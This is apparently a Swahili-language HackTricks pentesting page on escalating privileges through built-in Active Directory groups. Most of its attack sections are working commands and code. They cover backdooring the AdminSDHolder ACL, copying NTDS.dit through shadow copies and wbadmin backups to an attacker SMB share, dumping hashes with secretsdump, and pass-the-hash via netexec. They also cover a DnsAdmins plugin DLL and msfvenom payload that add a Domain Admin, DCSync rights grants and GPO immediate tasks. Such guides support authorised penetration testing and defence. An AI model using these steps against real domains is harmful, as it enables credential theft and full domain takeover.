# Vikundi Vilivyo na Haki za Juu

{{#include ../../banners/hacktricks-training.md}}

## Vikundi Vinavyojulikana Vyenye Haki za Usimamizi

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Kikundi hiki kina mamlaka ya kuunda akaunti na vikundi visivyo vya wasimamizi kwenye domain. Zaidi ya hayo, kinawezesha kuingia ndani ya kifaa kwenye Domain Controller (DC).

Ili kutambua wanachama wa kikundi hiki, amri ifuatayo hutekelezwa:

```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```

Kuongeza watumiaji wapya kunaruhusiwa, na pia kuingia ndani ya DC.<sup>[[1]](#references)</sup>

Njia ya masharti kutoka usimamizi wa akaunti hadi ufikiaji wa local administrator ni **kundi la kawaida lililokabidhiwa ruhusa ya kusoma nenosiri la LAPS la kompyuta**. Kagua haki halisi za kuandika uanachama kwenye kundi hilo, kama limelindwa, na kama akaunti mpya au unayoidhibiti inaweza kweli kujiunga nalo. Onyesha upya tokeni ya akaunti kabla ya kujaribu ruhusa yake ya kusoma LAPS ya kompyuta lengwa. Kwa Windows LAPS iliyosimbwa, ruhusa ya kusoma kwenye directory na mamlaka ya kusimbua nenosiri ni mahitaji tofauti; uanachama wa kundi au uanachama wa Account Operators pekee hauhakikishi mojawapo. Tazama [wigo wa Account Operators wa Microsoft](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups) na [ukabidhi wa Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory).

## Kundi la AdminSDHolder

Access Control List (ACL) ya kundi la **AdminSDHolder** ni muhimu kwa sababu huweka ruhusa za "protected groups" zote ndani ya Active Directory, zikiwemo makundi yenye marupurupu ya juu. Utaratibu huu huhakikisha usalama wa makundi haya kwa kuzuia marekebisho yasiyoidhinishwa.

Mshambuliaji anaweza kutumia udhaifu huu kwa kurekebisha ACL ya kundi la **AdminSDHolder** na kumpa mtumiaji wa kawaida ruhusa kamili. Hilo lingempa mtumiaji huyo udhibiti kamili juu ya protected groups zote. Ruhusa za mtumiaji huyo zikibadilishwa au kuondolewa, zitarejeshwa kiotomatiki ndani ya saa moja kutokana na muundo wa mfumo.<sup>[[14]](#references)</sup>

Nyaraka za hivi karibuni za Windows Server bado zinachukulia makundi kadhaa ya waendeshaji yaliyojengewa ndani kuwa objects **protected** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, n.k.). Mchakato wa **SDProp** huendeshwa kwenye **PDC Emulator** kila baada ya dakika 60 kwa chaguomsingi, huweka `adminCount=1`, na huzima inheritance kwenye objects zilizolindwa. Hii ni muhimu kwa persistence na pia kutafuta watumiaji wa zamani wenye marupurupu ambao waliondolewa kwenye kundi lililolindwa lakini bado wana ACL isiyorithiwa.<sup>[[12]](#references)</sup>

Amri za kukagua wanachama na kurekebisha ruhusa ni pamoja na:

```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
  Select-Object distinguishedName
```

Hati (script) inapatikana ili kuharakisha mchakato wa kurejesha: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Kwa maelezo zaidi, tembelea [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).<sup>[[14]](#references)</sup>

## AD Recycle Bin

Uwezo wa kuona objects zilizofutwa hudhibitiwa na ruhusa halisi za directory; jina la group pekee halithibitishi kwamba identity ya sasa inaweza kuorodhesha au kurejesha object. AD Recycle Bin lazima iwe imewashwa kabla ya kufutwa kwa object ili iweze kurejeshwa kikamilifu. Pia, kurejesha kunahitaji ruhusa ya Reanimate-Tombstones kwenye mzizi wa naming context, ruhusa za kubadilisha jina, na CREATE_CHILD kwenye container lengwa. Mwongozo wa [Microsoft kuhusu Recycle Bin](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) na [kanuni za idhini ya undelete](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004) unatofautisha masharti haya. Identity iliyoidhinishwa yenye ruhusa ya kusoma objects zilizofutwa inaweza kukagua rekodi zinazoweza kufichua taarifa nyeti:

```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

Hii ni muhimu kwa **kurejesha njia za awali za kupata ruhusa za juu**. Hata vitu vilivyofutwa vinaweza bado kufichua `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, SPN za zamani, au DN ya kundi la ruhusa za juu lililofutwa ambalo operator mwingine anaweza kurejesha baadaye.

Sifa zilizofafanuliwa na application pia zinaweza kuhifadhi nyenzo za zamani za uthibitishaji wakati kitu kinabaki katika hali iliyofutwa. Ichukulie hii kama kidokezo tofauti cha ukaguzi: identity ya sasa lazima iruhusiwe ku-enumerate kitu kilichofutwa **na** kusoma sifa hiyo, thamani lazima iwe credential inayoweza kutumika, na principal ambayo bado inatumika lazima ikubali credential hiyo. Uanachama wa kundi au jina la akaunti iliyofutwa pekee havithibitishi hatua hizi; epuka kuchapisha thamani za credential wakati wa enumeration ya kawaida. [Microsoft's Recycle Bin documentation](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) inaeleza uhifadhi wa sifa baada ya kufutwa.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
  -Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
  Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```

### Ufikiaji wa Domain Controller

Ufikiaji wa faili kwenye DC umezuiwa isipokuwa mtumiaji awe mwanachama wa kundi la `Server Operators`, jambo linalobadilisha kiwango cha ufikiaji.

### Privilege Escalation

Kwa kutumia `PsService` au `sc` kutoka Sysinternals, mtu anaweza kukagua na kurekebisha ruhusa za huduma. Kwa mfano, kundi la `Server Operators` lina udhibiti kamili wa huduma fulani, na hivyo kuruhusu utekelezaji wa amri holela na privilege escalation:<sup>[[1]](#references)</sup>

```cmd
C:\> .\PsService.exe security AppReadiness
```

Amri hii inaonyesha kuwa `Server Operators` wana ufikiaji kamili, unaowezesha kubadilisha huduma ili kupata marupurupu ya juu.

## Backup Operators

Uanachama katika `Backup Operators` unaweza kutoa `SeBackupPrivilege` na `SeRestorePrivilege` kwenye host, kutegemea sera yake ya ndani na kipindi cha kuingia. Kagua **token inayotumika ya mchakato unaoendesha amri** kwa kutumia `whoami /groups` na `whoami /priv`: uanachama pekee hauthibitishi kuwa `SeBackupPrivilege` ipo na imewashwa. Ikiwa privilege ipo lakini imezimwa, inaweza kuwashwa kwenye token hiyo; ikiwa haipo au imeondolewa, shughuli hizi za backup haziwezi kuitumia. `SeBackupPrivilege` inaruhusu **usomaji** wa data iliyolindwa kupitia API zinazotambua backup (kwa mfano, `FILE_FLAG_BACKUP_SEMANTICS` au `robocopy /B`); `SeRestorePrivilege` ni privilege tofauti inayotumika kwa shughuli za kurejesha/kuandika. Kuorodhesha saraka na kunakili faili kwa njia za kawaida si lazima kutumia semantiki za backup.<sup>[[1]](#references)</sup>

Ili kuorodhesha washiriki wa kundi, tekeleza:

```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```

### Shambulio la Ndani

Kwenye host ambayo token inayotumika ina `SeBackupPrivilege`, nakala inayozingatia backup inaweza kusoma faili lililolindwa:

1. Leta maktaba zinazohitajika:

```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. Ikiwa privilege ipo lakini imezimwa, iwezeshe na uthibitishe hali yake katika mchakato huu:

```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

3. Nakili faili kutoka kwenye saraka yenye ufikiaji wenye vikwazo, kwa mfano:

```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```

### AD Attack

`NTDS.dit` ni hifadhidata ya Active Directory kwenye **domain controller (DC)**. Njia hii inahitaji token inayofaa kwenye DC na ufikiaji wa volume iliyo na hifadhidata; kuwa mwanachama wa Backup Operators mahali pengine hakukupi ufikiaji wa DC fulani. Kwa kawaida hifadhidata inayotumika huwa imefungwa, kwa hivyo tumia shadow copy inayofikika au kifaa kingine cha backup kabla ya kuinakili. Kuunda au kufichua shadow copy pia hutegemea usanidi wa VSS wa host na ruhusa za mtumiaji anayeitekeleza. Mfano ulio hapa chini unachukulia kuwa DC huhifadhi `NTDS.dit` kwenye `C:` chini ya `\Windows\NTDS`; rekebisha volume na path ikiwa sivyo.

#### Kutumia diskshadow.exe

1. Ikiwa inaruhusiwa, unda na ufichue shadow copy ya drive ya `C:` ya DC kama `F:`:

```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```

2. Nakili `NTDS.dit` kutoka kwenye nakala kivuli:

```cmd
mkdir C:\Tools
Copy-FileSeBackupPrivilege F:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

Vinginevyo, tumia `robocopy` kunakili faili:

```cmd
robocopy /B F:\Windows\NTDS C:\Tools ntds.dit
```

3. Hifadhi hive ya `SYSTEM` ya DC kwa ajili ya uchimbaji offline. `SAM` ni hifadhidata ya akaunti za ndani kwenye mifumo wanachama; hive ya `SAM` ya DC si mbadala wa `NTDS.dit` wala chanzo cha hash ya Administrator ya domain:

```cmd
reg save HKLM\SYSTEM C:\Tools\SYSTEM.SAV
```

4. Hamisha `ntds.dit` na `SYSTEM.SAV` hadi kwenye host ya uchanganuzi na utoe hashes za akaunti za domain. Hive ya `SAM` iliyohifadhiwa kutoka kwenye mfumo mwanachama, pamoja na hive inayolingana ya `SYSTEM`, hutoa hashes za akaunti za ndani badala yake:

```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

5. Ikiwa hash ya **domain** Administrator ilipatikana kutoka `NTDS.dit`, inaweza kujaribiwa kwa uthibitishaji wa domain. Hash ya Administrator ya ndani kutoka `SAM.SAV` ni credential tofauti na haithibitishi utambulisho kama Administrator wa domain.<sup>[[11]](#references)</sup>

```bash
# Use the recovered domain Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```

#### Kutumia wbadmin.exe

1. Sanidi mfumo wa faili wa NTFS kwa seva ya SMB kwenye mashine ya mshambuliaji na uhifadhi kwenye akiba kitambulisho cha SMB kwenye mashine lengwa.
2. Tumia `wbadmin.exe` kwa hifadhi rudufu ya mfumo na utoaji wa `NTDS.dit`:
   ```cmd
   net use X: \\<AttackIP>\sharename /user:smbuser password
   echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
   wbadmin get versions
   echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
   ```

Kwa onyesho la vitendo, tazama [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Wanachama wa kikundi cha **DnsAdmins** wanaweza kutumia vibaya ruhusa zao kupakia DLL yoyote yenye ruhusa za SYSTEM kwenye seva ya DNS, ambayo mara nyingi hupangishwa kwenye Domain Controllers. Uwezo huu unaruhusu uwezekano mkubwa wa kufanya mashambulizi.

Ili kuorodhesha wanachama wa kikundi cha DnsAdmins, tumia:

```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```

### Tekeleza DLL ya kiholela (CVE‑2021‑40469)

> [!NOTE]
> Udhaifu huu unaruhusu utekelezaji wa msimbo wowote wenye marupurupu ya SYSTEM katika huduma ya DNS (kwa kawaida ndani ya DCs). Tatizo hili lilirekebishwa mwaka 2021.

Wanachama wanaweza kufanya seva ya DNS ipakie DLL yoyote (iwe ya ndani au kutoka kwa share ya mbali) kwa kutumia amri kama hizi:

```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```

Kuanzisha upya huduma ya DNS (ambayo inaweza kuhitaji ruhusa za ziada) ni muhimu ili DLL ipakizwe:

```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

Kwa maelezo zaidi kuhusu vector hii ya shambulizi, rejelea ired.team.

#### Mimilib.dll

Pia inawezekana kutumia mimilib.dll kutekeleza amri, kwa kuibadilisha ili itekeleze amri maalum au reverse shells. [Angalia chapisho hili](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) kwa maelezo zaidi.<sup>[[15]](#references)</sup>

### Rekodi ya WPAD kwa MitM

DnsAdmins wanaweza kudhibiti rekodi za DNS ili kutekeleza mashambulizi ya Man-in-the-Middle (MitM) kwa kuunda rekodi ya WPAD baada ya kuzima global query block list. Zana kama Responder au Inveigh zinaweza kutumika kufanya spoofing na kunasa trafiki ya mtandao.

### Event Log Readers
Wanachama wanaweza kufikia kumbukumbu za matukio na huenda wakapata taarifa nyeti kama vile nywila za plaintext au maelezo ya utekelezaji wa amri:

```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```

## Exchange Windows Permissions

Kikundi hiki kinaweza kurekebisha DACL kwenye object ya domain, na huenda kikajipa ruhusa za DCSync. Mbinu za kuongeza ruhusa kwa kutumia kikundi hiki zimeelezwa kwa kina kwenye repo ya GitHub ya Exchange-AD-Privesc.

```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```

Ikiwa unaweza kutenda kama mwanachama wa kundi hili, matumizi mabaya ya kawaida ni kumpa principal anayedhibitiwa na mshambuliaji ruhusa za replication zinazohitajika kwa [DCSync](dcsync.md):

```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```

Kihistoria, **PrivExchange** iliunganisha ufikiaji wa mailbox, kulazimisha authentication ya Exchange, na LDAP relay ili kufikia primitive hii hii. Hata pale njia hiyo ya relay inapozuiwa, uanachama wa moja kwa moja katika `Exchange Windows Permissions` au udhibiti wa server ya Exchange bado ni njia yenye thamani kubwa ya kupata haki za domain replication.

## Hyper-V Administrators

Hyper-V Administrators wana ufikiaji kamili wa Hyper-V, ambao unaweza kutumiwa kupata udhibiti wa Domain Controllers zilizovirtualize. Hii inajumuisha ku-clone DC zilizo hai na kutoa NTLM hashes kutoka kwenye faili ya NTDS.dit.

### Mfano wa Exploitation

Matumizi mabaya ya vitendo kwa kawaida huhusisha **ufikiaji wa offline wa diski/checkpoint za DC**, badala ya mbinu za zamani za LPE kwenye host. Kwa ufikiaji wa host ya Hyper-V, operator anaweza kuunda checkpoint au ku-export Domain Controller iliyovirtualize, ku-mount VHDX, na kutoa `NTDS.dit`, `SYSTEM`, na siri nyingine bila kugusa LSASS ndani ya guest:

```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```

Kutoka hapo, tumia tena workflow ya `Backup Operators` kunakili `Windows\NTDS\ntds.dit` na registry hives ukiwa offline. Workflow inayohusiana ya backup-file:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners	

Kikundi hiki huruhusu wanachama kuunda Group Policies kwenye domain. Hata hivyo, wanachama wake hawawezi kutumia group policies kwa watumiaji au vikundi, wala kuhariri GPO zilizopo.

Jambo muhimu ni kwamba **mtu aliyeunda GPO anakuwa mmiliki wake** na kwa kawaida hupata ruhusa za kutosha kuihariri baadaye. Hiyo inamaanisha kikundi hiki kinafaa kuzingatiwa unapoweza:

- kuunda GPO hasidi na kumshawishi admin kuiunganisha na OU/domain lengwa
- kuhariri GPO uliyounda ambayo tayari imeunganishwa mahali panapofaa
- kutumia vibaya ruhusa nyingine iliyokabidhiwa inayokuruhusu kuunganisha GPO, huku kikundi hiki kikikupa uwezo wa kuihariri

Kwa kawaida, matumizi mabaya ya vitendo huhusisha kuongeza mabadiliko ya **Immediate Task**, **startup script**, **local admin membership**, au **user rights assignment** kupitia faili za policy zinazohifadhiwa kwenye SYSVOL.<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>

```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```

Ikiwa unahariri GPO wewe mwenyewe kupitia `SYSVOL`, kumbuka kuwa mabadiliko pekee hayatoshi: `versionNumber`, `GPT.ini`, na wakati mwingine `gPCMachineExtensionNames` lazima pia zisasishwe, la sivyo wateja watapuuza uonyeshaji upya wa policy.<sup>[[9]](#references)</sup>

## Usimamizi wa Shirika

Katika mazingira ambamo **Microsoft Exchange** imesakinishwa, kuna group maalum linalojulikana kama **Organization Management** lenye uwezo mkubwa. Group hili lina privilege ya **kufikia mailbox za watumiaji wote wa domain** na lina **udhibiti kamili juu ya Organizational Unit (OU) ya 'Microsoft Exchange Security Groups'**. Udhibiti huu unajumuisha group la **`Exchange Windows Permissions`**, ambalo linaweza kutumiwa kwa privilege escalation.

### Kutumia Privilege na Amri

#### Print Operators

Wanachama wa group la **Print Operators** wana privilege kadhaa, zikiwemo **`SeLoadDriverPrivilege`**, inayowawezesha **kuingia kwenye Domain Controller moja kwa moja**, kuizima, na kusimamia printers. Ili kutumia privilege hizi, hasa ikiwa **`SeLoadDriverPrivilege`** haionekani katika muktadha usio na elevation, ni lazima kufanya bypass ya User Account Control (UAC).<sup>[[1]](#references)</sup>

Kutumia amri ifuatayo ya PowerShell kuorodhesha wanachama wa group hili:

```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```

Kwenye Domain Controllers, kundi hili ni hatari kwa sababu sera chaguomsingi ya Domain Controller huwapa `Print Operators` ruhusa ya **`SeLoadDriverPrivilege`**. Ukipata tokeni iliyoinuliwa ya mwanachama wa kundi hili, unaweza kuwasha ruhusa hiyo na kupakia driver iliyosainiwa lakini yenye udhaifu ili kupata ufikiaji wa kernel/SYSTEM.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> Kwa maelezo kuhusu kushughulikia tokeni, angalia [Tokeni za Ufikiaji](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Wanachama wa kundi hili hupewa ufikiaji wa PC kupitia Remote Desktop Protocol (RDP). Ili kuhesabu wanachama hawa, amri za PowerShell zinapatikana:

```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```

Maelezo zaidi kuhusu kutumia RDP vibaya yanapatikana katika nyenzo maalum za pentesting.

#### Remote Management Users

Wanachama wanaweza kufikia PC kupitia **Windows Remote Management (WinRM)**. Uchunguzi wa wanachama hawa hufanywa kupitia:

```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```

Kwa mbinu za exploitation zinazohusiana na **WinRM**, ni vyema kushauriana na nyaraka mahususi.

#### Server Operators

Kikundi hiki kina ruhusa ya kufanya usanidi mbalimbali kwenye Domain Controllers, ikiwemo haki za kufanya backup na kurejesha, kubadilisha saa ya mfumo, na kuzima mfumo.<sup>[[1]](#references)</sup> Ili kuorodhesha wanachama, amri iliyotolewa ni:

```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```

Kwenye Vidhibiti vya Kikoa, `Server Operators` kwa kawaida hurithi haki za kutosha **kusanidi upya au kuwasha/kuzima huduma** na pia hupokea `SeBackupPrivilege`/`SeRestorePrivilege` kupitia sera chaguomsingi ya DC. Kwa vitendo, hii huwafanya kuwa daraja kati ya **matumizi mabaya ya udhibiti wa huduma** na **uchotaji wa NTDS**:

```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```

Kushindwa kuorodhesha services hakumaanishi kuwa huwezi kufikia **service inayojulikana**. Service Control Manager hukagua `SC_MANAGER_ENUMERATE_SERVICE` kwa ajili ya kuorodhesha services kando na `SC_MANAGER_CONNECT`; kufungua service iliyotajwa hukagua haki zake yenyewe, zikiwemo `SERVICE_CHANGE_CONFIG` na `SERVICE_START`. Kagua token inayotumika na ACL ya service hiyo hata kama `sc.exe query` ya jumla itashindwa. Haki za kubadilisha usanidi pekee ni kidokezo tu: utambulisho wa service, haki za kuianzisha/kusimamisha, na trigger inayoweza kutumika bado huamua kama inawezekana kufanya mabadiliko yanayopandisha haki. Tazama [marejeleo ya Microsoft kuhusu haki za ufikiaji wa services](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Ikiwa ACL ya service hii italipa group hii haki za kubadilisha/kuanzisha, elekeza service kwenye amri yoyote, ianzishe kama `LocalSystem`, kisha urejeshe `binPath` ya awali. Ikiwa udhibiti wa service umezuiwa, tumia mbinu za `Backup Operators` zilizo hapo juu kunakili `NTDS.dit`.

## References

- [1] [ired.team – Akaunti Zenye Haki za Juu na Haki za Tokeni](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Kutumia SeLoadDriverPrivilege Vibaya kwa Kupandisha Haki](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Kutumia Vibaya Ruhusa za GPO](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – Matumizi Mabaya ya GPO, Sehemu ya 1 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – Mwongozo wa Red Teamer kuhusu GPO na OU](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – Kazi ya ZwLoadDriver](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — LDAP Isiyojulikana → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Kiambatisho C: Akaunti na Groups Zilizolindwa katika Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – Jinsi ya Kutumia na Kuweka Backdoor kwenye AdminSDHolder ili Kupata Uendelevu wa Domain Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Kutumia Haki ya DnsAdmins Vibaya kwa Kupandisha Haki katika Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – Taarifa kuhusu matumizi mabaya ya edge ya GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – Kazi ya NtLoadDriver (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
{{#include ../../banners/hacktricks-training.md}}
